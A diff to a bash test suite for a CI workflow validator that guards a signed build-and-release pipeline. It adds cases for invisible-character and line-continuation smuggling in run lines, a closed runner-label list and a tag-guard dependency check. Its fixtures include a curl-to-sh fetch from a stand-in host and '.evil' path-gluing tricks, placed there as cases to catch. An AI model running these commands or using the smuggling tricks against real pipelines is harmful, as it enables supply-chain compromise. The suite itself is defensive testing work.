@@ -542,6 +542,9 @@ caught "AC3 workflow-level run-name" 'permissions:\n  contents: read\njobs' "run
 caught "AC1 a step with two run: keys (the second the benign sign line)" "      $SIGNLINE" "      run: curl -s https://x.example/p | sh\n        $SIGNLINE"
 caught "AC1 a job with two permissions: keys (the second the benign one)" '    permissions:\n      contents: read\n      id-token: write' '    permissions: write-all\n    permissions:\n      contents: read\n      id-token: write'
 caught "AC1 two top-level permissions: keys (the second the benign one)" 'permissions:\n  contents: read\njobs' "permissions: write-all\npermissions:\n  contents: read\njobs"
+caught "AC1 run line: a trailing NBSP after the sign line (str.strip() would drop it; bash keeps it in the last word)" "$SIGNLINE" "$SIGNLINE"$'\u00a0'
+caught "AC1 run line: a leading NBSP before the install line" 'run: bash bin/install-scanner.sh cosign' 'run: '$'\u00a0''bash bin/install-scanner.sh cosign'
+caught "AC1 run line: a trailing U+200B after the sign line" "$SIGNLINE" "$SIGNLINE"$'\u200b'
 caught "AC1 two top-level on: keys (the second the benign workflow_call)" '\non:' "\non: push\non:"
 caught "AC1 job runs in a container" 'runs-on: ubuntu-24.04' 'runs-on: ubuntu-24.04\n    container: alpine'
 caught "AC2 extra input" 'digests:\n        description' 'script:\n        type: string\n      digests:\n        description'
@@ -657,7 +660,7 @@ expect ok "fixture tree: the grammar holds, every stage script is listed with it
 okcase() { d=$(mk "$1"); stage "$d" "$2"; expect ok "AC1 grammar: $3" tree "$d"; }
 badcase() { d=$(mk "$1"); stage "$d" "$2"; expect caught "AC1 grammar: $3" tree "$d"; }
 okcase g_ok1 $'set -euo pipefail\nbash bin/build-stage.sh apk' "set -euo pipefail then a listed script"
-okcase g_ok2 $'bash bin/build-stage.sh \\\n  --flag=1 \\\n  two' "a continued line with literal arguments"
+badcase g_ok2 $'bash bin/build-stage.sh \\\n  --flag=1 \\\n  two' "a backslash-newline continuation, even with literal arguments (advisor: refused outright; Sonnet #249 continuation)"
 okcase g_ok3 $'python3 -I bin/chain-verify.py stage-start --stage rebuild --previous build --record r.json' "chain-verify.py stage-start from a non-Sign stage (only its sign subcommand is a signer)"
 # Opus r4 B1: every python3 line of a stage file runs isolated (-I): stage jobs hold id-token: write
 badcase g_noI $'python3 bin/chain-verify.py stage-start --stage rebuild --previous build --record r.json' "python3 without -I in a stage file (a bin/<stdlib name>.py would shadow the standard library)"
@@ -712,7 +715,15 @@ argcase() { # argcase NAME 'run' ok|caught LABEL [env names, default V; "-" for 
   expect "$3" "AC1 grammar: $4" tree "$d"; }
 argcase a_ok_whole 'bash bin/build-stage.sh "$V"' ok 'control: a whole "$V" read of the step env'
 argcase a_ok_brace 'bash bin/build-stage.sh "${V}"' ok 'control: a whole "${V}" read of the step env'
-argcase a_ok_lit 'bash bin/build-stage.sh plain '"'"'single quoted'"'"' --flag=1' ok 'control: plain and single-quoted literals' -
+argcase a_ok_lit 'bash bin/build-stage.sh plain '"'"'single quoted'"'"' --flag 1 a_b/c.d-e' ok 'control: plain and single-quoted literals' -
+# LIT_WORD is closed to what a stage line needs (Codex #249 r6 sweep): letters, digits, _ . / - ; anything else must be single-quoted
+argcase a_eq 'bash bin/build-stage.sh --flag=1' caught 'an unquoted = in a literal argument (tightened LIT_WORD)' -
+argcase a_at 'bash bin/build-stage.sh a@b' caught 'an unquoted @ in a literal argument (tightened LIT_WORD)' -
+argcase a_pct 'bash bin/build-stage.sh a%b' caught 'an unquoted % in a literal argument (tightened LIT_WORD)' -
+argcase a_colon 'bash bin/build-stage.sh sha256:abc' caught 'an unquoted : in a literal argument (tightened LIT_WORD)' -
+argcase a_plus 'bash bin/build-stage.sh a+b' caught 'an unquoted + in a literal argument (tightened LIT_WORD)' -
+argcase a_comma 'bash bin/build-stage.sh a,b' caught 'an unquoted , in a literal argument (tightened LIT_WORD)' -
+argcase a_ok_sqeq 'bash bin/build-stage.sh '"'"'--flag=1'"'"'' ok 'control: the same text single-quoted is a literal' -
 argcase a_prefix 'bash bin/build-stage.sh prefix"$V"' caught 'a literal prefix glued to a whole read, prefix"$V" (Codex #249 r5 B4)'
 argcase a_suffix 'bash bin/build-stage.sh "$V"suffix' caught 'a whole read with a literal suffix, "$V"suffix (B4 sibling)'
 argcase a_two 'bash bin/build-stage.sh "$V""$X1"' caught 'two whole reads glued into one word, "$V""$X1" (B4 sibling)' 'V X1'
@@ -735,6 +746,40 @@ argcase a_qmark 'bash bin/build-stage.sh bin/x?.sh' caught 'a ? glob at argument
 argcase a_bracket 'bash bin/build-stage.sh bin/[ab].sh' caught 'a [..] glob at argument position (B4 sibling)' -
 argcase a_brace 'bash bin/build-stage.sh a{b,c}' caught 'a brace expansion at argument position, a{b,c} (B4 sibling)' -
 argcase a_notinenv 'bash bin/build-stage.sh "$DIGESTS"' caught 'a whole read of DIGESTS, listed in env_names but not declared in this step env (B4 control for the env rule)' -
+# run-line characters and continuations (Sonnet #249 continuation; advisor: refuse, never model how bash joins): any backslash-newline,
+# any backslash outside a single-quoted literal, and any control, non-ASCII whitespace or invisible character (Z*/C*) is refused
+rawcase() { # rawcase NAME ok|caught ENV(- for none) JSON-RUN LABEL : the run value written as a YAML double-quoted (JSON) string
+  local d e; d=$(mk "$1")
+  if [ "$3" = - ]; then e="      - run: "; else e="      - env:\n          $3: x\n        run: "; fi
+  printf "jobs:\n  j:\n    steps:\n${e}%s\n" "$4" > "$d/.github/workflows/stage-verify.yml"; expect "$2" "AC1 run line: $5" tree "$d"; }
+rawcase r_ok_single ok - '"bash bin/build-stage.sh a"' 'control: one listed run line'
+rawcase r_ok_two ok - '"bash bin/build-stage.sh a\nbash bin/build-stage.sh b\n"' 'control: a block scalar of two listed run lines, each judged alone'
+rawcase r_ok_sqbs ok - '"bash bin/build-stage.sh '"'"'a\\b'"'"'"' 'control: a backslash inside a single-quoted literal'
+rawcase r_probe_path caught - '"bash bin/build-stage.sh\\\n.evil"' 'a backslash-newline gluing .evil onto the script path (bash runs bin/build-stage.sh.evil; Sonnet probe 1)'
+rawcase r_probe_arg caught V '"bash bin/build-stage.sh pre\\\n\"$V\""' 'a backslash-newline gluing a literal to a whole read (bash passes preVALUE; Sonnet probe 2)'
+rawcase r_trail caught - '"bash bin/build-stage.sh arg\\\n"' 'a trailing backslash-newline continuation'
+rawcase r_contread caught V '"bash bin/build-stage.sh \\\n\"$V\""' 'a backslash-newline before a whole read'
+rawcase r_basl caught - '"ba\\\nsh bin/build-stage.sh a"' 'a backslash-newline inside the command word, ba-backslash-newline-sh'
+rawcase r_escspace caught - '"bash bin/build\\ stage.sh"' 'an escaped space in the script path'
+rawcase r_escquote caught - '"bash bin/build-stage.sh a\\\"b"' 'an escaped double quote, a-backslash-quote-b'
+rawcase r_escdollar caught - '"bash bin/build-stage.sh \\$V"' 'an escaped dollar'
+rawcase r_bsdq caught - '"bash bin/build-stage.sh \"a\\b\""' 'a backslash inside double quotes'
+rawcase r_cr caught - '"bash bin/build-stage.sh a\rb"' 'a CR inside a run line (bash keeps it in the word)'
+rawcase r_tab caught - '"bash bin/build-stage.sh\ta"' 'a tab between words'
+rawcase r_vt caught - '"bash bin/build-stage.sh a\u000bb"' 'a vertical tab inside a word'
+rawcase r_ff caught - '"bash bin/build-stage.sh a\fb"' 'a form feed inside a word'
+rawcase r_nul caught - '"bash bin/build-stage.sh a\u0000b"' 'a NUL inside a word'
+rawcase r_esc caught - '"bash bin/build-stage.sh a\u001bb"' 'an ESC control character inside a word'
+rawcase r_nbsp caught - '"bash bin/build-stage.sh a\u00a0b"' 'a NBSP between words (one word to bash)'
+rawcase r_ideo caught - '"bash bin/build-stage.sh a\u3000b"' 'an ideographic space between words'
+rawcase r_zwpath caught - '"bash bin/build-stage.sh\u200b a"' 'a U+200B in the script path'
+rawcase r_zwsq caught - '"bash bin/build-stage.sh '"'"'a\u200bb'"'"'"' 'a U+200B inside a single-quoted literal'
+rawcase r_nbspsq caught - '"bash bin/build-stage.sh '"'"'a\u00a0b'"'"'"' 'a NBSP inside a single-quoted literal'
+rawcase r_tabsq caught - '"bash bin/build-stage.sh '"'"'a\tb'"'"'"' 'a tab inside a single-quoted literal'
+rawcase r_ls caught - '"bash bin/build-stage.sh a\u2028b"' 'a U+2028 line separator inside a word'
+rawcase r_nel caught - '"bash bin/build-stage.sh a\u0085b"' 'a U+0085 next-line inside a word'
+rawcase r_bidi caught - '"bash bin/build-stage.sh a\u202eb"' 'a right-to-left override inside a word'
+rawcase r_bom caught - '"\ufeffbash bin/build-stage.sh a"' 'a byte-order mark before the command'
 d=$(mk g_envok); printf 'jobs:\n  j:\n    steps:\n      - env:\n          V: ${{ inputs.v }}\n        run: bash bin/build-stage.sh "$V"\n' > "$d/.github/workflows/stage-verify.yml"
 expect ok "AC1 grammar: a whole \"\$NAME\" read of the step's own env:" tree "$d"
 d=$(mk g_shell); printf 'jobs:\n  j:\n    steps:\n      - shell: python\n        run: bash bin/build-stage.sh a\n' > "$d/.github/workflows/stage-verify.yml"
@@ -1435,6 +1480,398 @@ jobs:
     steps:
       - run: bash bin/build-stage.sh a
 EOF
+ycase y_fold_ok "control: a folded run: > that joins two lines with a space (the judge reads the folded value GitHub runs)" ok <<'EOF'
+jobs:
+  j:
+    steps:
+      - run: >
+          bash bin/build-stage.sh
+          a
+EOF
+ycase y_fold_bs "a folded run: > whose first line ends in a backslash (folds to an escaped space)" <<'EOF'
+jobs:
+  j:
+    steps:
+      - run: >
+          bash bin/build-stage.sh\
+          .evil
+EOF
+# the runner label set is CLOSED (Codex #249 r6 B5): exactly ubuntu-22.04, ubuntu-24.04 (each optionally -arm) and ubuntu-latest,
+# for a direct runs-on and for every matrix value runs-on reads
+ycase y_h1_direct "control: runs-on ubuntu-22.04" ok <<'EOF'
+jobs:
+  j:
+    runs-on: "ubuntu-22.04"
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h1_matrix "control: runs-on through a matrix leaf ubuntu-22.04" ok <<'EOF'
+jobs:
+  j:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      matrix:
+        runner: ["ubuntu-22.04"]
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h2_direct "control: runs-on ubuntu-24.04" ok <<'EOF'
+jobs:
+  j:
+    runs-on: "ubuntu-24.04"
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h2_matrix "control: runs-on through a matrix leaf ubuntu-24.04" ok <<'EOF'
+jobs:
+  j:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      matrix:
+        runner: ["ubuntu-24.04"]
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h3_direct "control: runs-on ubuntu-24.04-arm" ok <<'EOF'
+jobs:
+  j:
+    runs-on: "ubuntu-24.04-arm"
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h3_matrix "control: runs-on through a matrix leaf ubuntu-24.04-arm" ok <<'EOF'
+jobs:
+  j:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      matrix:
+        runner: ["ubuntu-24.04-arm"]
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h4_direct "control: runs-on ubuntu-22.04-arm" ok <<'EOF'
+jobs:
+  j:
+    runs-on: "ubuntu-22.04-arm"
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h4_matrix "control: runs-on through a matrix leaf ubuntu-22.04-arm" ok <<'EOF'
+jobs:
+  j:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      matrix:
+        runner: ["ubuntu-22.04-arm"]
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h5_direct "control: runs-on ubuntu-latest" ok <<'EOF'
+jobs:
+  j:
+    runs-on: "ubuntu-latest"
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h5_matrix "control: runs-on through a matrix leaf ubuntu-latest" ok <<'EOF'
+jobs:
+  j:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      matrix:
+        runner: ["ubuntu-latest"]
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h6_direct "runs-on ubuntu-." caught <<'EOF'
+jobs:
+  j:
+    runs-on: "ubuntu-."
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h6_matrix "runs-on through a matrix leaf ubuntu-." caught <<'EOF'
+jobs:
+  j:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      matrix:
+        runner: ["ubuntu-."]
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h7_direct "runs-on ubuntu-..." caught <<'EOF'
+jobs:
+  j:
+    runs-on: "ubuntu-..."
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h7_matrix "runs-on through a matrix leaf ubuntu-..." caught <<'EOF'
+jobs:
+  j:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      matrix:
+        runner: ["ubuntu-..."]
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h8_direct "runs-on ubuntu-24..04" caught <<'EOF'
+jobs:
+  j:
+    runs-on: "ubuntu-24..04"
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h8_matrix "runs-on through a matrix leaf ubuntu-24..04" caught <<'EOF'
+jobs:
+  j:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      matrix:
+        runner: ["ubuntu-24..04"]
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h9_direct "runs-on ubuntu-24.04.1.2" caught <<'EOF'
+jobs:
+  j:
+    runs-on: "ubuntu-24.04.1.2"
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h9_matrix "runs-on through a matrix leaf ubuntu-24.04.1.2" caught <<'EOF'
+jobs:
+  j:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      matrix:
+        runner: ["ubuntu-24.04.1.2"]
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h10_direct "runs-on ubuntu-0" caught <<'EOF'
+jobs:
+  j:
+    runs-on: "ubuntu-0"
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h10_matrix "runs-on through a matrix leaf ubuntu-0" caught <<'EOF'
+jobs:
+  j:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      matrix:
+        runner: ["ubuntu-0"]
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h11_direct "runs-on ubuntu-99.99" caught <<'EOF'
+jobs:
+  j:
+    runs-on: "ubuntu-99.99"
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h11_matrix "runs-on through a matrix leaf ubuntu-99.99" caught <<'EOF'
+jobs:
+  j:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      matrix:
+        runner: ["ubuntu-99.99"]
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h12_direct "runs-on ubuntu-20.04" caught <<'EOF'
+jobs:
+  j:
+    runs-on: "ubuntu-20.04"
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h12_matrix "runs-on through a matrix leaf ubuntu-20.04" caught <<'EOF'
+jobs:
+  j:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      matrix:
+        runner: ["ubuntu-20.04"]
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h13_direct "runs-on ubuntu-18.04" caught <<'EOF'
+jobs:
+  j:
+    runs-on: "ubuntu-18.04"
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h13_matrix "runs-on through a matrix leaf ubuntu-18.04" caught <<'EOF'
+jobs:
+  j:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      matrix:
+        runner: ["ubuntu-18.04"]
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h14_direct "runs-on ubuntu-latest-arm" caught <<'EOF'
+jobs:
+  j:
+    runs-on: "ubuntu-latest-arm"
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h14_matrix "runs-on through a matrix leaf ubuntu-latest-arm" caught <<'EOF'
+jobs:
+  j:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      matrix:
+        runner: ["ubuntu-latest-arm"]
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h15_direct "runs-on ubuntu-24.04-ARM" caught <<'EOF'
+jobs:
+  j:
+    runs-on: "ubuntu-24.04-ARM"
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h15_matrix "runs-on through a matrix leaf ubuntu-24.04-ARM" caught <<'EOF'
+jobs:
+  j:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      matrix:
+        runner: ["ubuntu-24.04-ARM"]
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h16_direct "runs-on ubuntu-24.04-arm64" caught <<'EOF'
+jobs:
+  j:
+    runs-on: "ubuntu-24.04-arm64"
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h16_matrix "runs-on through a matrix leaf ubuntu-24.04-arm64" caught <<'EOF'
+jobs:
+  j:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      matrix:
+        runner: ["ubuntu-24.04-arm64"]
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h17_direct "runs-on ubuntu-" caught <<'EOF'
+jobs:
+  j:
+    runs-on: "ubuntu-"
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h17_matrix "runs-on through a matrix leaf ubuntu-" caught <<'EOF'
+jobs:
+  j:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      matrix:
+        runner: ["ubuntu-"]
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h18_direct "runs-on UBUNTU-LATEST" caught <<'EOF'
+jobs:
+  j:
+    runs-on: "UBUNTU-LATEST"
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h18_matrix "runs-on through a matrix leaf UBUNTU-LATEST" caught <<'EOF'
+jobs:
+  j:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      matrix:
+        runner: ["UBUNTU-LATEST"]
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h19_direct "runs-on trailing space" caught <<'EOF'
+jobs:
+  j:
+    runs-on: "ubuntu-24.04 "
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h19_matrix "runs-on through a matrix leaf trailing space" caught <<'EOF'
+jobs:
+  j:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      matrix:
+        runner: ["ubuntu-24.04 "]
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h20_direct "runs-on trailing newline" caught <<'EOF'
+jobs:
+  j:
+    runs-on: "ubuntu-24.04\n"
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h20_matrix "runs-on through a matrix leaf trailing newline" caught <<'EOF'
+jobs:
+  j:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      matrix:
+        runner: ["ubuntu-24.04\n"]
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h21_direct "runs-on U+2010 hyphen lookalike" caught <<'EOF'
+jobs:
+  j:
+    runs-on: "ubuntu\u201024.04"
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h21_matrix "runs-on through a matrix leaf U+2010 hyphen lookalike" caught <<'EOF'
+jobs:
+  j:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      matrix:
+        runner: ["ubuntu\u201024.04"]
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h22_direct "runs-on U+2024 dot lookalike" caught <<'EOF'
+jobs:
+  j:
+    runs-on: "ubuntu-24\u202404"
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_h22_matrix "runs-on through a matrix leaf U+2024 dot lookalike" caught <<'EOF'
+jobs:
+  j:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      matrix:
+        runner: ["ubuntu-24\u202404"]
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
 # listed scripts: the text scan (Sonnet blocker 2, Opus B6/B7)
 S1='#!/usr/bin/env bash\nset -euo pipefail\nwitness run -- bin/build-apk.sh\n'
 scriptcase s_if caught "${S1}if curl evil.example; then :; fi\n" '' "if curl (a keyword before the command, Sonnet 2)"
@@ -1792,7 +2229,36 @@ if [ "$ok_n" = 1 ]; then pass=$((pass + 1)); echo "ok   with legacy-stage-files.
 g="$work/gitcopy"; rm -rf "$g"; cp -R "$REAL" "$g"; ( cd "$g" && git init -q . && git add -A && git -c user.name=t -c user.email=t@t -c commit.gpgsign=false commit -qm c )
 printf 'cosign attest --type slsaprovenance x\n' > "$g/bin/untracked-signer.sh"
 expect ok "an UNTRACKED file holding a signer is not in the tracked copy CI judges" tree "$(tracked_copy fromgit "$g")"
-EXPECT=392
+# (Codex #249 r6 R8) the tag guard after Sign is carried by needs:, not by an `if:` conjunct: every release.yml job from build to promotion
+# that is not dry-run-only (if: exactly ${{ inputs.dry-run }}) depends on admission (tag-guarded) directly or through its needs
+cat > "$work/tagguard.py" <<'PY'
+import sys, yaml
+d = yaml.load(open(sys.argv[1]).read(), Loader=yaml.BaseLoader); jobs = d.get("jobs") or {}
+def needs(j):
+    n = (jobs.get(j) or {}).get("needs") or []
+    return [n] if isinstance(n, str) else list(n)
+def reaches(j, seen=()):
+    return any(x == "admission" or (x not in seen and reaches(x, seen + (j,))) for x in needs(j))
+order = list(jobs); chain = order[order.index("build"):order.index("promotion") + 1]
+bad = [j for j in chain if str(jobs[j].get("if", "")).strip() != "${{ inputs.dry-run }}" and not reaches(j)]
+if "admission" not in jobs or not str(jobs["admission"].get("if", "")).startswith("${{ startsWith(github.ref, 'refs/tags/v')"): bad.append("admission is not tag-guarded")
+print("; ".join(bad) or "ok"); sys.exit(1 if bad else 0)
+PY
+tg() { local rc=0 out; out=$(python3 "$work/tagguard.py" "$2") || rc=$?
+  if { [ "$1" = ok ] && [ "$rc" = 0 ]; } || { [ "$1" = caught ] && [ "$rc" != 0 ]; }; then pass=$((pass + 1)); echo "ok   $3${out:+ ($out)}"; else failn=$((failn + 1)); echo "FAIL $3 -> $out"; fi; }
+tg ok "$root/.github/workflows/release.yml" "R8 release.yml: every job from build to promotion that is not dry-run-only depends on the tag-guarded admission through needs"
+cp "$root/.github/workflows/release.yml" "$work/rel-noadm.yml"
+python3 - "$work/rel-noadm.yml" <<'PY'
+import re, sys
+t = open(sys.argv[1]).read()
+for j in ("promotion", "authorization", "acceptance-predicate"):
+    t = re.sub(r"(\n  %s:\n(?:    .*\n|\s*\n)*?    needs: )(.*)" % re.escape(j), lambda m: m.group(1) + "[" + ", ".join(x for x in re.findall(r"[\w-]+", m.group(2)) if x != "admission") + "]", t, count=1)
+t = re.sub(r"(\n  build:\n(?:    .*\n|\s*\n)*?    needs: )admission", r"\1[]", t, count=1)
+open(sys.argv[1], "w").write(t)
+PY
+tg caught "$work/rel-noadm.yml" "R8 mutation: with admission removed from every needs list, the build-to-promotion jobs no longer reach admission and are caught"
+
+EXPECT=478
 echo "pass=$pass fail=$failn"
 if [ $((pass + failn)) != "$EXPECT" ]; then echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1; fi
 [ "$failn" = 0 ]
